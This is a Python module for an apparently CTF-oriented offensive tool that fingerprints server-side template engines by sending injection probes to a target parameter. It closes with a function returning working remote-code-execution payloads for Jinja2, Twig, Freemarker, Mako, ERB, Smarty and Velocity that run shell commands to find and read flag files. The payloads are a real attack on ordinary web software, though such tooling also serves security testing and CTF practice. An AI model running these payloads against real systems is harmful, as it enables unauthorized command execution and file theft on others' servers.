"""
SSTI Engine Fingerprinter - Matrix-based parallel template engine detection

Uses response fingerprinting across multiple probes to accurately identify
the template engine. Based on comprehensive testing matrix from SSTImap.

Key Innovation: Instead of testing ONE probe and guessing, we test MULTIPLE
probes in PARALLEL and match the response pattern against known engine signatures.
"""

import asyncio
import logging
from typing import Dict, List, Optional, Tuple, Set, Callable, Any
from dataclasses import dataclass, field
from enum import Enum


class TemplateEngine(Enum):
    """Supported template engines with language info"""
    # Ruby
    ERB = ("ERB", "Ruby")
    ERUBI = ("Erubi", "Ruby")
    ERUBIS = ("Erubis", "Ruby")
    HAML = ("Haml", "Ruby")
    LIQUID_RUBY = ("Liquid", "Ruby")
    SLIM = ("Slim", "Ruby")
    MUSTACHE_RUBY = ("Mustache", "Ruby")

    # Golang
    GO_HTML_TEMPLATE = ("html/template", "Golang")
    GO_TEXT_TEMPLATE = ("text/template", "Golang")

    # Dotnet
    RAZOR = ("RazorEngine.NetCore", "Dotnet")
    DOTLIQUID = ("DotLiquid", "Dotnet")
    SCRIBAN = ("Scriban", "Dotnet")
    FLUID = ("Fluid", "Dotnet")

    # Elixir
    EEX = ("EEx", "Elixir")

    # Java
    GROOVY = ("Groovy", "Java")
    FREEMARKER = ("Freemarker", "Java")
    VELOCITY = ("Velocity", "Java")
    THYMELEAF = ("Thymeleaf", "Java")
    THYMELEAF_INLINE = ("Thymeleaf (Inline)", "Java")

    # PHP
    BLADE = ("Blade", "PHP")
    TWIG = ("Twig", "PHP")
    TWIG_SANDBOX = ("Twig (Sandbox)", "PHP")
    MUSTACHE_PHP = ("Mustache.php", "PHP")
    SMARTY = ("Smarty", "PHP")
    LATTE = ("Latte", "PHP")

    # Python
    JINJA2 = ("Jinja2", "Python")
    JINJA2_SANDBOX = ("Jinja2 (Sandbox)", "Python")
    TORNADO = ("Tornado", "Python")
    MAKO = ("Mako", "Python")
    DJANGO = ("Django", "Python")
    SIMPLE_TEMPLATE = ("SimpleTemplateEngine", "Python")
    PYSTACHE = ("Pystache", "Python")
    CHEETAH3 = ("Cheetah3", "Python")
    CHAMELEON = ("Chameleon", "Python")

    # JavaScript
    HANDLEBARS = ("Handlebars", "Javascript")
    EJS = ("EJS", "Javascript")
    UNDERSCORE = ("Underscore", "Javascript")
    VUEJS = ("VueJS", "Javascript")
    MUSTACHE_JS = ("MustacheJS", "Javascript")
    PUG = ("Pug", "Javascript")
    ANGULARJS = ("AngularJS", "Javascript")
    HOGAN = ("HoganJS", "Javascript")
    NUNJUCKS = ("Nunjucks", "Javascript")
    DOT = ("Dot", "Javascript")
    VELOCITYJS = ("VelocityJS", "Javascript")
    ETA = ("Eta", "Javascript")
    TWIGJS = ("TwigJS", "Javascript")

    UNKNOWN = ("Unknown", "Unknown")

    def __init__(self, engine_name: str, language: str):
        self.engine_name = engine_name
        self.language = language


# Response constants
RESP_ERROR = "Error"
RESP_UNMODIFIED = "Unmodified"
RESP_EMPTY = "Empty"


@dataclass
class ProbeResult:
    """Result of a single probe test"""
    probe_name: str
    payload: str
    expected: Dict[str, str]  # engine -> expected response
    actual_response: str
    response_type: str  # "Error", "Unmodified", "Empty", or actual value
    matched_engines: List[str]  # Engines that match this response


@dataclass
class FingerprintResult:
    """Complete fingerprinting result"""
    detected_engine: TemplateEngine
    confidence: float
    language: str
    probe_results: List[ProbeResult]
    matching_scores: Dict[str, float]  # engine -> score
    detection_payload: str  # The payload that confirmed detection


class SSTIFingerprinter:
    """
    Matrix-based SSTI engine fingerprinter using parallel probing.

    Uses response patterns across multiple probes to definitively identify
    the template engine, similar to how SSTImap works.
    """

    def __init__(self):
        self.logger = logging.getLogger(__name__)

        # ============================================================
        # PROBE PAYLOADS - Each probe tests a specific behavior
        # ============================================================

        # Error-inducing probes (syntax errors in specific engines)
        self.error_probes = {
            "err1": "<th:t=\"${xu}#foreach.<p>",
            "err2": "<%'${{#{%>}}",
            "err3": "$%\\",
            "err4": "<#set($x<%=%>)",
            "err5": "<%=%>",
            "errJava2": "<th:t=\"${xu}#foreach.<",
            "errRuby": "<%{{#{%>}",
            "errDotnet": "{{@}}",
            "errJava": "<%'#{@}",
            "errPHP": "{{7*'7'}}",  # Key! Jinja2 = 7777777, Twig = 49, Django = error
            "errPython": "{#${#}}",
            "errJavascript": "<%${#{{{",
            "errGolang": "{{.}}",
            "errElixir": "<%",
        }

        # Non-error probes (valid syntax that produces different outputs)
        self.nonerr_probes = {
            "nonerr1": "p \">[[${{1}}]]",
            "nonerr2": "<%=1%>@*#{1}",
            "nonerr3": "{##}/*{{.}}*/",
            "nonerrRuby": "<%=1%>#{2}{{a}}",
            "nonerrDotnet": "{{1}}@*",
            "nonerrJava": "a\">##[[${1}]]",
            "nonerrPHP": "{{7*7}}",  # Key! Returns 49 for Jinja2/Twig, literal for Django
            "nonerrPython": "{#${{1}}#}}",
            "nonerrJavascript": "//*<!--{##<%=1%>{{!--{{1}}--}}-->*/#}",
            "nonerrGolang": "{{.}}",
            "nonerrElixir": "<%%a%>",
        }

        # Identity probes - CRITICAL for distinguishing similar engines
        self.identity_probes = {
            "nonerrIdent1": "{{1==1}}",    # Jinja2="True", Twig="1", Django=Error
            "nonerrIdent2": "${\"<%-1-%>\"}",
            "nonerrIdent3": "<div th:t=\"${xu}\">a</div>",
        }

        # Quick detection probes (math expressions)
        self.quick_probes = {
            "math_curly": "{{7*7}}",       # Jinja2/Twig/Nunjucks = 49
            "math_dollar": "${7*7}",        # Freemarker/Mako = 49
            "math_erb": "<%= 7*7 %>",       # ERB/EJS = 49
            "math_hash": "#{7*7}",          # Ruby interpolation
            "string_mult": "{{7*'7'}}",     # Jinja2 = 7777777, Twig = 49
            "bool_test": "{{1==1}}",        # Jinja2 = True, Twig = 1, Nunjucks = true
        }

        # ============================================================
        # ENGINE FINGERPRINT DATABASE
        # Maps probe -> engine -> expected response
        # ============================================================

        self.engine_fingerprints = self._build_fingerprint_database()

    def _build_fingerprint_database(self) -> Dict[str, Dict[str, str]]:
        """
        Build the fingerprint database from the comprehensive matrix.
        Format: {probe_name: {engine_name: expected_response}}
        """
        db = {}

        # ============================================================
        # CRITICAL DISTINGUISHING PROBES
        # ============================================================

        # {{7*7}} - Math in curly braces
        db["math_curly"] = {
            "Jinja2": "49",
            "Jinja2 (Sandbox)": "49",
            "Twig": "49",
            "Twig (Sandbox)": "49",
            "Nunjucks": "49",
            "TwigJS": "49",
            "Smarty": "49",
            "Django": RESP_UNMODIFIED,  # Django doesn't evaluate expressions!
            "Freemarker": RESP_UNMODIFIED,
            "Velocity": RESP_UNMODIFIED,
            "ERB": RESP_UNMODIFIED,
            "Mako": RESP_UNMODIFIED,
            "Blade": RESP_ERROR,
            "Handlebars": RESP_UNMODIFIED,
            "Thymeleaf": RESP_UNMODIFIED,  # Thymeleaf uses [[...]] not {{...}}
            "Thymeleaf (Inline)": RESP_ERROR,
            "Groovy": RESP_UNMODIFIED,
            "Haml": RESP_UNMODIFIED,
            "Slim": RESP_UNMODIFIED,
            "Liquid": RESP_UNMODIFIED,
        }

        # {{7*'7'}} - String multiplication (Python vs PHP) - CRITICAL!
        db["string_mult"] = {
            "Jinja2": "7777777",          # Python: 7 * '7' = '7777777'
            "Jinja2 (Sandbox)": "7777777",
            "Tornado": "7777777",
            "Twig": "49",                  # PHP: 7 * '7' = 49 (type coercion)
            "Twig (Sandbox)": "49",
            "TwigJS": "NaN",               # JavaScript: 7 * '7' = NaN
            "Nunjucks": RESP_ERROR,
            "Django": RESP_ERROR,
            "Smarty": RESP_ERROR,
            "Thymeleaf": RESP_UNMODIFIED,  # Thymeleaf doesn't use {{}}
            "Thymeleaf (Inline)": RESP_ERROR,
            "Freemarker": RESP_UNMODIFIED,
            "ERB": RESP_UNMODIFIED,
            "Haml": RESP_UNMODIFIED,
            "Slim": RESP_UNMODIFIED,
            "Liquid": RESP_UNMODIFIED,
            "Groovy": RESP_UNMODIFIED,
        }

        # {{1==1}} - Boolean evaluation (CRITICAL!)
        db["bool_test"] = {
            "Jinja2": "True",              # Python boolean
            "Jinja2 (Sandbox)": "True",
            "Tornado": "True",
            "SimpleTemplateEngine": "True",
            "Twig": "1",                   # PHP boolean (cast to string)
            "Twig (Sandbox)": "1",
            "Latte": "{1}",
            "Nunjucks": "",                # JavaScript (empty for truthy?)
            "TwigJS": RESP_ERROR,
            "Django": RESP_ERROR,          # Django doesn't evaluate
            "Blade": RESP_ERROR,
            "Smarty": RESP_ERROR,
            "Handlebars": RESP_ERROR,
            "MustacheJS": RESP_ERROR,
            "Thymeleaf": RESP_UNMODIFIED,  # Thymeleaf doesn't use {{}}
            "Thymeleaf (Inline)": RESP_ERROR,
            "Freemarker": RESP_UNMODIFIED,
            "ERB": RESP_UNMODIFIED,
            "Haml": RESP_UNMODIFIED,
            "Slim": RESP_UNMODIFIED,
            "Liquid": RESP_UNMODIFIED,
            "Groovy": RESP_UNMODIFIED,
        }

        # ${7*7} - Dollar-curly syntax
        db["math_dollar"] = {
            "Freemarker": "49",
            "Mako": "49",
            "Groovy": "49",
            "Thymeleaf": RESP_UNMODIFIED,
            "Velocity": RESP_UNMODIFIED,
            "Jinja2": RESP_UNMODIFIED,
            "Twig": RESP_UNMODIFIED,
            "ERB": RESP_UNMODIFIED,
        }

        # <%= 7*7 %> - ERB/EJS syntax
        db["math_erb"] = {
            "ERB": "49",
            "Erubi": "49",
            "Erubis": "49",
            "EJS": "49",
            "Eta": "49",
            "Jinja2": RESP_UNMODIFIED,
            "Twig": RESP_UNMODIFIED,
            "Django": RESP_UNMODIFIED,
        }

        # ============================================================
        # ERROR PROBE FINGERPRINTS
        # ============================================================

        # errPHP: {{7*'7'}} used as error probe
        db["errPHP"] = {
            "Jinja2": "7}",  # Partial parse
            "Twig": "7}",
            "Django": RESP_ERROR,
            "Blade": RESP_ERROR,
            "Smarty": RESP_ERROR,
            "Nunjucks": RESP_ERROR,
            "Freemarker": RESP_UNMODIFIED,
            "Velocity": RESP_UNMODIFIED,
            "ERB": RESP_UNMODIFIED,
            "Mako": RESP_UNMODIFIED,
        }

        # errRuby: <%{{#{%>}
        db["errRuby"] = {
            "ERB": RESP_ERROR,
            "Erubi": RESP_ERROR,
            "Erubis": RESP_ERROR,
            "Haml": RESP_ERROR,
            "Slim": RESP_ERROR,
            "Liquid": RESP_ERROR,
            "Jinja2": RESP_ERROR,
            "Twig": RESP_ERROR,
            "Django": RESP_UNMODIFIED,
            "Freemarker": RESP_ERROR,
            "Groovy": RESP_ERROR,
        }

        # errPython: {#${#}}
        db["errPython"] = {
            "Jinja2": RESP_ERROR,
            "Tornado": RESP_ERROR,
            "Mako": RESP_ERROR,
            "Django": RESP_ERROR,
            "Cheetah3": RESP_ERROR,
            "Twig": RESP_ERROR,
            "Blade": RESP_ERROR,
            "Smarty": RESP_ERROR,
        }

        # ============================================================
        # NON-ERROR PROBE FINGERPRINTS
        # ============================================================

        # nonerrPHP: {{7*7}} in non-error context
        db["nonerrPHP"] = {
            "Jinja2": "7}",
            "Twig": "7}",
            "Nunjucks": "7}",
            "TwigJS": "7}",
            "Django": RESP_ERROR,
            "Blade": "7}",
            "Smarty": "7}",
        }

        # nonerrIdent1: {{1==1}} - THE KEY DISTINGUISHER
        db["nonerrIdent1"] = {
            "Jinja2": "True",
            "Jinja2 (Sandbox)": "True",
            "Tornado": "True",
            "SimpleTemplateEngine": "True",
            "Twig": "1",
            "Twig (Sandbox)": RESP_ERROR,  # Sandbox blocks comparison
            "Latte": "{1}",
            "Latte (Sandbox)": "{1}",
            "Nunjucks": RESP_EMPTY,
            "Django": RESP_ERROR,
            "Blade": RESP_ERROR,
            "Smarty": RESP_ERROR,
            "Handlebars": RESP_ERROR,
            "TwigJS": RESP_ERROR,
            "VueJS": RESP_ERROR,
        }

        # nonerrRuby: <%=1%>#{2}{{a}}
        db["nonerrRuby"] = {
            "ERB": "1#{2}{{a}}",
            "Erubi": "1#{2}{{a}}",
            "Erubis": "1#{2}{{a}}",
            "Haml": "<%=1%>2{{a}}",
            "Slim": "<%=1%>2{{a}}",
            "Jinja2": "<%=1%>#{2}",
            "Twig": "<%=1%>#{2}",
            "Django": "<%=1%>#{2}",
            "Tornado": RESP_ERROR,
            "Freemarker": "<%=1%>2{{a}}",
        }

        return db

    async def fingerprint_engine(
        self,
        submit_func: Callable,
        parameter: str,
        max_concurrent: int = 10
    ) -> FingerprintResult:
        """
        Identify template engine using parallel probe testing.

        Args:
            submit_func: Async function that takes {param: payload} and returns response
            parameter: The parameter name to inject into
            max_concurrent: Max concurrent requests (default 10)

        Returns:
            FingerprintResult with detected engine and confidence
        """
        self.logger.info("Starting SSTI engine fingerprinting with parallel probes...")

        # Semaphore to limit concurrent requests
        semaphore = asyncio.Semaphore(max_concurrent)

        async def test_probe(probe_name: str, payload: str) -> Tuple[str, str, str]:
            """Test a single probe with rate limiting"""
            async with semaphore:
                try:
                    response = await submit_func({parameter: payload})
                    response_text = response.text if hasattr(response, 'text') else str(response)

                    # Classify the response
                    response_type = self._classify_response(payload, response_text)

                    return (probe_name, payload, response_type)
                except Exception as e:
                    self.logger.debug(f"Probe {probe_name} failed: {e}")
                    return (probe_name, payload, RESP_ERROR)

        # ============================================================
        # PHASE 1: Quick detection probes (parallel)
        # ============================================================
        self.logger.info("Phase 1: Running quick detection probes...")

        quick_tasks = [
            test_probe(name, payload)
            for name, payload in self.quick_probes.items()
        ]
        quick_results = await asyncio.gather(*quick_tasks, return_exceptions=True)

        # Process quick results
        probe_responses = {}
        for result in quick_results:
            if isinstance(result, Exception):
                continue
            probe_name, payload, response_type = result
            probe_responses[probe_name] = response_type
            self.logger.info(f"  {probe_name}: {payload} → {response_type[:50] if len(response_type) > 50 else response_type}")

        # Check if we have a clear match from quick probes
        initial_matches = self._match_responses(probe_responses)

        if initial_matches and initial_matches[0][1] > 0.8:
            # High confidence match, but let's confirm with identity probes
            top_engine = initial_matches[0][0]
            self.logger.info(f"Initial match: {top_engine} (confidence: {initial_matches[0][1]:.2f})")

        # ============================================================
        # PHASE 2: Identity probes (parallel) - CRITICAL for disambiguation
        # ============================================================
        self.logger.info("Phase 2: Running identity probes for disambiguation...")

        identity_tasks = [
            test_probe(name, payload)
            for name, payload in self.identity_probes.items()
        ]
        identity_results = await asyncio.gather(*identity_tasks, return_exceptions=True)

        for result in identity_results:
            if isinstance(result, Exception):
                continue
            probe_name, payload, response_type = result
            probe_responses[probe_name] = response_type
            self.logger.info(f"  {probe_name}: {payload} → {response_type[:50] if len(response_type) > 50 else response_type}")

        # ============================================================
        # PHASE 3: Error probes (parallel) - Helps distinguish edge cases
        # ============================================================
        self.logger.info("Phase 3: Running error probes...")

        error_tasks = [
            test_probe(name, payload)
            for name, payload in self.error_probes.items()
        ]
        error_results = await asyncio.gather(*error_tasks, return_exceptions=True)

        for result in error_results:
            if isinstance(result, Exception):
                continue
            probe_name, payload, response_type = result
            probe_responses[probe_name] = response_type

        # ============================================================
        # PHASE 4: Match against fingerprint database
        # ============================================================
        self.logger.info("Phase 4: Matching response pattern against engine database...")

        final_matches = self._match_responses(probe_responses)

        if not final_matches:
            self.logger.warning("No template engine detected")
            return FingerprintResult(
                detected_engine=TemplateEngine.UNKNOWN,
                confidence=0.0,
                language="Unknown",
                probe_results=[],
                matching_scores={},
                detection_payload=""
            )

        # Get the best match
        best_engine_name, best_score = final_matches[0]

        # Convert to TemplateEngine enum
        detected_engine = self._name_to_engine(best_engine_name)

        # Find the detection payload (the one that most uniquely identified this engine)
        detection_payload = self._find_detection_payload(probe_responses, best_engine_name)

        self.logger.info(f"✓ Detected: {best_engine_name} ({detected_engine.language})")
        self.logger.info(f"  Confidence: {best_score:.2f}")
        self.logger.info(f"  Detection payload: {detection_payload}")

        # Log runner-ups for debugging
        if len(final_matches) > 1:
            self.logger.info(f"  Runner-ups: {final_matches[1:5]}")

        return FingerprintResult(
            detected_engine=detected_engine,
            confidence=best_score,
            language=detected_engine.language,
            probe_results=[],  # Could populate with ProbeResult objects
            matching_scores={name: score for name, score in final_matches},
            detection_payload=detection_payload
        )

    def _classify_response(self, payload: str, response_text: str) -> str:
        """
        Classify response into categories: Error, Unmodified, Empty, or actual value

        IMPORTANT: Check for EVALUATED results BEFORE checking for unmodified payload!
        The response might contain both the payload AND the result.
        """
        import re
        response_lower = response_text.lower()

        # Check for error indicators FIRST
        error_indicators = [
            "error", "exception", "traceback", "syntax error",
            "template error", "parse error", "undefined", "fatal",
            "warning:", "notice:", "cannot", "invalid", "unexpected"
        ]

        if any(err in response_lower for err in error_indicators):
            return RESP_ERROR

        # Check if empty
        if not response_text.strip():
            return RESP_EMPTY

        # ============================================================
        # CHECK FOR EVALUATED RESULTS FIRST (before unmodified check!)
        # This is critical because response may contain BOTH payload AND result
        # ============================================================

        # For math probes {{7*7}} or ${7*7}, look for "49"
        if "7*7" in payload:
            # Check if 49 appears in response (indicates successful evaluation)
            if "49" in response_text:
                return "49"

        # For string multiplication {{7*'7'}}, check for Python vs PHP result
        if "7*'7'" in payload or "7*\"7\"" in payload:
            if "7777777" in response_text:
                return "7777777"  # Python: 7 * '7' = '7777777'
            if "49" in response_text:
                return "49"       # PHP: 7 * '7' = 49 (type coercion)
            if "NaN" in response_text:
                return "NaN"      # JavaScript

        # For boolean probes {{1==1}}
        if "1==1" in payload:
            if "True" in response_text:
                return "True"     # Python boolean
            if "true" in response_text.lower():
                # Check it's not just part of another word
                if re.search(r'\btrue\b', response_text, re.IGNORECASE):
                    return "true"  # JavaScript boolean
            # PHP returns "1" for true - look for isolated "1" not in the payload
            response_without_payload = response_text.replace(payload, '')
            if re.search(r'(?<![0-9=])1(?![0-9=])', response_without_payload):
                return "1"        # PHP boolean

        # ============================================================
        # NOW check if payload is reflected unmodified
        # Only return UNMODIFIED if no evaluation was detected above
        # ============================================================
        if payload in response_text:
            return RESP_UNMODIFIED

        # Return a normalized/truncated response for matching
        # Strip common HTML/whitespace
        clean = response_text.strip()
        if len(clean) > 100:
            clean = clean[:100]

        return clean if clean else RESP_EMPTY

    def _match_responses(self, probe_responses: Dict[str, str]) -> List[Tuple[str, float]]:
        """
        Match probe responses against engine fingerprint database.

        Uses a scoring system that:
        1. Weights critical discriminating probes heavily
        2. Requires matches on critical probes to rank highly
        3. Penalizes mismatches on critical probes

        Returns: List of (engine_name, score) sorted by score descending
        """
        engine_scores: Dict[str, float] = {}
        engine_matches: Dict[str, int] = {}
        engine_total: Dict[str, int] = {}
        engine_critical_matches: Dict[str, int] = {}
        engine_critical_total: Dict[str, int] = {}

        # Critical probes - MUST match for engine to be considered
        critical_probes = {"math_curly", "string_mult", "bool_test", "nonerrIdent1"}

        # Weight certain probes more heavily (they're more discriminating)
        probe_weights = {
            "bool_test": 3.0,      # {{1==1}} is MOST discriminating
            "string_mult": 2.5,    # {{7*'7'}} distinguishes Python from PHP
            "math_curly": 2.0,     # {{7*7}} distinguishes template engines from non-template
            "nonerrIdent1": 3.0,   # Same as bool_test
            "errPHP": 1.5,
            "math_dollar": 1.5,
            "math_erb": 1.5,
        }

        for probe_name, actual_response in probe_responses.items():
            if probe_name not in self.engine_fingerprints:
                continue

            expected_responses = self.engine_fingerprints[probe_name]
            weight = probe_weights.get(probe_name, 1.0)
            is_critical = probe_name in critical_probes

            for engine_name, expected in expected_responses.items():
                if engine_name not in engine_scores:
                    engine_scores[engine_name] = 0.0
                    engine_matches[engine_name] = 0
                    engine_total[engine_name] = 0
                    engine_critical_matches[engine_name] = 0
                    engine_critical_total[engine_name] = 0

                engine_total[engine_name] += 1
                if is_critical:
                    engine_critical_total[engine_name] += 1

                # Check if response matches expected
                if self._responses_match(actual_response, expected):
                    engine_matches[engine_name] += 1
                    engine_scores[engine_name] += weight
                    if is_critical:
                        engine_critical_matches[engine_name] += 1
                elif is_critical:
                    # PENALTY for mismatching critical probes
                    engine_scores[engine_name] -= weight * 0.5

        # Normalize scores and calculate confidence
        results = []
        for engine_name, score in engine_scores.items():
            if engine_total[engine_name] > 0:
                # Calculate max possible weighted score
                max_possible = sum(probe_weights.get(p, 1.0) for p in probe_responses.keys()
                                  if p in self.engine_fingerprints and
                                  engine_name in self.engine_fingerprints[p])

                if max_possible > 0:
                    # Base confidence from weighted matches
                    confidence = max(0, score) / max_possible

                    # BONUS: If engine matches ALL critical probes it has entries for
                    critical_total = engine_critical_total.get(engine_name, 0)
                    critical_matches = engine_critical_matches.get(engine_name, 0)
                    if critical_total > 0 and critical_matches == critical_total:
                        # Matched all critical probes - boost confidence
                        confidence = min(1.0, confidence * 1.2)
                    elif critical_total > 0 and critical_matches < critical_total / 2:
                        # Failed most critical probes - reduce confidence
                        confidence = confidence * 0.5

                    results.append((engine_name, confidence))

        # Sort by confidence descending
        results.sort(key=lambda x: x[1], reverse=True)

        return results

    def _responses_match(self, actual: str, expected: str) -> bool:
        """Check if actual response matches expected response"""
        if expected == RESP_ERROR:
            return actual == RESP_ERROR
        if expected == RESP_UNMODIFIED:
            return actual == RESP_UNMODIFIED
        if expected == RESP_EMPTY:
            return actual == RESP_EMPTY or actual.strip() == ""

        # For specific values, check containment (response might have extra stuff)
        return expected in actual or actual == expected

    def _name_to_engine(self, engine_name: str) -> TemplateEngine:
        """Convert engine name string to TemplateEngine enum"""
        name_map = {
            "Jinja2": TemplateEngine.JINJA2,
            "Jinja2 (Sandbox)": TemplateEngine.JINJA2_SANDBOX,
            "Twig": TemplateEngine.TWIG,
            "Twig (Sandbox)": TemplateEngine.TWIG_SANDBOX,
            "Django": TemplateEngine.DJANGO,
            "Freemarker": TemplateEngine.FREEMARKER,
            "Velocity": TemplateEngine.VELOCITY,
            "Thymeleaf": TemplateEngine.THYMELEAF,
            "Thymeleaf (Inline)": TemplateEngine.THYMELEAF_INLINE,
            "ERB": TemplateEngine.ERB,
            "Erubi": TemplateEngine.ERUBI,
            "Erubis": TemplateEngine.ERUBIS,
            "Mako": TemplateEngine.MAKO,
            "Tornado": TemplateEngine.TORNADO,
            "Smarty": TemplateEngine.SMARTY,
            "Blade": TemplateEngine.BLADE,
            "Nunjucks": TemplateEngine.NUNJUCKS,
            "EJS": TemplateEngine.EJS,
            "Handlebars": TemplateEngine.HANDLEBARS,
            "Pug": TemplateEngine.PUG,
            "Groovy": TemplateEngine.GROOVY,
            "Liquid": TemplateEngine.LIQUID_RUBY,
            "DotLiquid": TemplateEngine.DOTLIQUID,
            "Mustache": TemplateEngine.MUSTACHE_RUBY,
            "Mustache.php": TemplateEngine.MUSTACHE_PHP,
            "MustacheJS": TemplateEngine.MUSTACHE_JS,
            "Latte": TemplateEngine.LATTE,
            "VueJS": TemplateEngine.VUEJS,
            "AngularJS": TemplateEngine.ANGULARJS,
            "TwigJS": TemplateEngine.TWIGJS,
            "Eta": TemplateEngine.ETA,
            "Haml": TemplateEngine.HAML,
            "Slim": TemplateEngine.SLIM,
            "EEx": TemplateEngine.EEX,
            "Chameleon": TemplateEngine.CHAMELEON,
            "Cheetah3": TemplateEngine.CHEETAH3,
            "SimpleTemplateEngine": TemplateEngine.SIMPLE_TEMPLATE,
            "Pystache": TemplateEngine.PYSTACHE,
            "html/template": TemplateEngine.GO_HTML_TEMPLATE,
            "text/template": TemplateEngine.GO_TEXT_TEMPLATE,
            "RazorEngine.NetCore": TemplateEngine.RAZOR,
            "Scriban": TemplateEngine.SCRIBAN,
            "Fluid": TemplateEngine.FLUID,
            "HoganJS": TemplateEngine.HOGAN,
            "Dot": TemplateEngine.DOT,
            "Underscore": TemplateEngine.UNDERSCORE,
            "VelocityJS": TemplateEngine.VELOCITYJS,
        }
        return name_map.get(engine_name, TemplateEngine.UNKNOWN)

    def _find_detection_payload(self, probe_responses: Dict[str, str], engine_name: str) -> str:
        """Find the payload that most uniquely identified this engine"""

        # Priority order for detection payloads
        priority_probes = ["bool_test", "string_mult", "math_curly", "nonerrIdent1"]

        for probe_name in priority_probes:
            if probe_name in probe_responses and probe_name in self.engine_fingerprints:
                if engine_name in self.engine_fingerprints[probe_name]:
                    payload = self.quick_probes.get(probe_name) or self.identity_probes.get(probe_name)
                    if payload:
                        return payload

        # Fallback to first successful probe
        for probe_name, payload in {**self.quick_probes, **self.identity_probes}.items():
            if probe_name in probe_responses and probe_responses[probe_name] not in [RESP_ERROR, RESP_UNMODIFIED]:
                return payload

        return "{{7*7}}"  # Default


# ============================================================
# CONVENIENCE FUNCTIONS
# ============================================================

async def fingerprint_ssti(
    submit_func: Callable,
    parameter: str,
) -> FingerprintResult:
    """
    Convenience function to fingerprint SSTI vulnerability.

    Args:
        submit_func: Async function that submits payloads
        parameter: Parameter to test

    Returns:
        FingerprintResult with detected engine
    """
    fingerprinter = SSTIFingerprinter()
    return await fingerprinter.fingerprint_engine(submit_func, parameter)


def get_rce_payloads(engine: TemplateEngine) -> List[str]:
    """
    Get RCE payloads for a specific template engine.
    Payloads search for flag files using find/cat chains.
    """
    # Shell commands that search for flags
    FLAG_SEARCH_CMDS = [
        # Try multiple common paths including /tmp
        "cat /flag.txt 2>/dev/null || cat /flag 2>/dev/null || cat /tmp/flag 2>/dev/null || cat /tmp/flag.txt 2>/dev/null || cat /app/flag.txt 2>/dev/null || cat /app/flag 2>/dev/null",
        # Find and cat any flag file
        "find / -name '*flag*' -type f 2>/dev/null | head -5 | xargs cat 2>/dev/null",
        # Grep for flag pattern in common locations
        "grep -r 'FLAG{\\|XBEN{\\|CTF{' /app /home /tmp /var 2>/dev/null | head -5",
        # List directories to find flag
        "ls -la / /app /home /tmp 2>/dev/null; cat /flag* /app/flag* /tmp/flag* 2>/dev/null",
        # Specific paths - order by most common
        "cat /tmp/flag",
        "cat /tmp/flag.txt",
        "cat /flag.txt",
        "cat /flag",
        "cat /app/flag.txt",
        "cat /app/flag",
    ]

    payloads = {
        TemplateEngine.JINJA2: [
            # Standalone Jinja2 payloads (work without Flask) - PUT FIRST
            *[f"{{% for x in ().__class__.__base__.__subclasses__() %}}{{% if 'warning' in x.__name__ %}}{{{{x()._module.__builtins__['__import__']('os').popen('{cmd}').read()}}}}{{% endif %}}{{% endfor %}}" for cmd in FLAG_SEARCH_CMDS[:4]],
            # Flask-specific payloads (use config/lipsum)
            *[f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}" for cmd in FLAG_SEARCH_CMDS[:4]],
            *[f"{{{{lipsum.__globals__.os.popen('{cmd}').read()}}}}" for cmd in FLAG_SEARCH_CMDS[:4]],
            # Cycler/joiner globals (works in more contexts)
            *[f"{{{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}" for cmd in FLAG_SEARCH_CMDS[:3]],
            # Class traversal with subprocess.Popen (index varies by Python version)
            "{{''.__class__.__mro__[1].__subclasses__()[407]('cat /tmp/flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag.txt',shell=True,stdout=-1).communicate()[0]}}",
        ],
        TemplateEngine.TWIG: [
            # Twig 2.x/3.x filter approach - try multiple paths
            *[f"{{{{['{cmd}']|filter('system')}}}}" for cmd in FLAG_SEARCH_CMDS[:5]],
            # Twig 1.x _self.env approach
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /tmp/flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag.txt')}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /tmp/flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag.txt')}}",
            # Map filter alternative
            *[f"{{{{['{cmd}']|map('system')|join}}}}" for cmd in FLAG_SEARCH_CMDS[4:7]],
        ],
        TemplateEngine.FREEMARKER: [
            *[f"<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('{cmd}')}}" for cmd in FLAG_SEARCH_CMDS[4:8]],
            "${\"freemarker.template.utility.Execute\"?new()(\"cat /tmp/flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag.txt\")}",
        ],
        TemplateEngine.MAKO: [
            *[f"${{__import__('os').popen('{cmd}').read()}}" for cmd in FLAG_SEARCH_CMDS[:4]],
        ],
        TemplateEngine.ERB: [
            "<%= `cat /tmp/flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag.txt 2>/dev/null || cat /flag` %>",
            "<%= system('cat /tmp/flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag.txt') %>",
            "<%= File.read('/tmp/flag') rescue File.read('/flag.txt') rescue File.read('/app/flag.txt') rescue File.read('/flag') %>",
            *[f"<%= `{cmd}` %>" for cmd in FLAG_SEARCH_CMDS[1:3]],
        ],
        TemplateEngine.SMARTY: [
            "{system('cat /tmp/flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag.txt || cat /flag')}",
            *[f"{{system('{cmd}')}}" for cmd in FLAG_SEARCH_CMDS[1:3]],
        ],
        TemplateEngine.VELOCITY: [
            "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($chr=$x.class.forName('java.lang.Character'))##\n#set($str=$x.class.forName('java.lang.String'))##\n#set($ex=$rt.getRuntime().exec('cat /tmp/flag 2>/dev/null || cat /flag.txt'))##\n$ex.waitFor()\n#set($out=$ex.getInputStream())##\n#foreach($i in [1..$out.available()])$chr.toString($out.read())#end",
        ],
    }

    # Also check sandbox variants
    if engine == TemplateEngine.JINJA2_SANDBOX:
        return payloads.get(TemplateEngine.JINJA2, [])
    if engine == TemplateEngine.TWIG_SANDBOX:
        return payloads.get(TemplateEngine.TWIG, [])

    return payloads.get(engine, [])
